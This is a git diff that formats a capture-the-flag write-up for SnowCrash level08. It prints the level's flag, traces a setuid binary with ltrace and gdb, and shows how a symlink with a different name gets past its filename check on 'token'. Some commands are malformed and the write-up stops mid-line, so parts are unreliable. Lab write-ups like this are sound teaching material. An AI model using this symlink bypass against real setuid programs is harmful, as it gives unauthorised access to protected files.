@@ -1,4 +1,13 @@
+# Level08
+
+## Flag
+
+25749xKZ8L7DkSCwJkT9dyv6f
+
+## Discovery
+
 we have 2
+```bash
 level08@SnowCrash files:~$ll
 total 28
 dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 ./
@@ -8,16 +17,20 @@ d--x--x--x  1 root    users    340 Aug 30  2015 ../
 -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
 -r-x------  1 level08 level08  675 Apr  3  2012 .profile*
 -rw-------  1 flag08  flag08    26 Mar  5  2016 token
-
+```
 when executing
+
+```bash
 the level08@SnowCrash file:~$ ./level08
 ./level08 [file to read]
-
+```
 
 when executing a file with the token argument
+
+```bash
 level08@SnowCrash:~$ ./level08 token 
 You may not access 'token'
-
+```
 The token file is not available directly
 His rights are -rw-------, which means that only flag08 can read him.
 The level08 program works on behalf of flag08
@@ -26,15 +39,17 @@ This means that if level08 opens a file, it is read with flag08 permissions.
 we are looking at which libraries are called using ltrace
 
 ltrace is a Linux utility that allows you to track library function calls (dynamic libraries) while the program is running
-
+```bash
 level08@SnowCrash:~$ ltrace ./level08 
 __libc_start_main(0x8048554, 1, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
 printf("%s [file to read]\n", "./level08"./level08 [file to read]
 )                                                                                  = 25
 exit(1 <unfinished ...>
 +++ exited (status 1) +++
-
+```
 we execute our file with the token argument first, then some other
+
+```bash
 level08@SnowCrash:~$ ltrace ./level08 ./token
 __libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
 strstr("./token", "token")                                                                                                  = "token"
@@ -42,8 +57,8 @@ printf("You may not access '%s'\n", "./token"You may not access './token'
 )                                                                              = 29
 exit(1 <unfinished ...>
 +++ exited (status 1) +++
-
-
+```
+```bash
 level08@SnowCrash:~$ echo lol > /tmp/level08
 level08@SnowCrash:~$ ltrace ./level08 /tmp/level08
 __libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
@@ -53,28 +68,32 @@ read(3, "lol\n", 1024)                                                          
 write(1, "lol\n", 4lol
 )                                                                                                        = 4
 +++ exited (status 4) +++
-
+```
 we see that when using an argument with a different name, the program is executed until the function call state
+```text
 is open("/tmp/level08", 0, 014435162522) = 3
 read(3, "lol\n", 1024) = 4
 write(1, "lol\n", 4lol
-
+```
 one of the vulnerabilities is the creation of soft links with full rights
+
+```bash
 ln -S./token /tmp/level08/token
 level08@SnowCrash:~$ ll /tmp/level08/token
 lrwxrwxrwx 1 level08 level08 7 Apr 10 11:35 /tmp/level08/token -> ./token
-
+```
 when calling the link, we get the same error
+```bash
 level08@SnowCrash:~$ ./level08 ./tmp/level08/token
 You may not access './tmp/level08/token'
-
+```
 gdb (GNU Debugger) is a debugger that helps analyze the operation of programs, find errors, and study their behavior at a low level.
 
 open our
 disassemble main executable file in gdb
 
 we get the output 
-
+```bash
 0x08048554 <+0>:     push   %ebp
    0x08048555 <+1>:     mov    %esp,%ebp
    0x08048557 <+3>:     and    $0xfffffff0,%esp
@@ -156,20 +175,22 @@ we get the output
    0x0804869d <+329>:   call   0x8048430 <__stack_chk_fail@plt>
    0x080486a2 <+334>:   leave  
    0x080486a3 <+335>:   ret 
+```
+we see that
 
-we see that 
+```bash
 call 0x8048400 <strstr@plt>   ; calling the strstr function
 test %eax, %eax ; check if the contents of eax are zero (NULL)
 je 0x80485e9 ; if eax == 0, go to label 0x80485e9 (substring not found)
-
+```
 therefore 
 we switch to execution and skip exit
 0x080485e9 <+149>: mov 0x1c(%esp),%eax
 
 we create a link with a different name, because we are checking for the file name and using it as a token.
-
+```bash
 ln -s ./token /tmp/level08/lol
-
+```
 
 ---------------------------
 у нас есть 2 файла
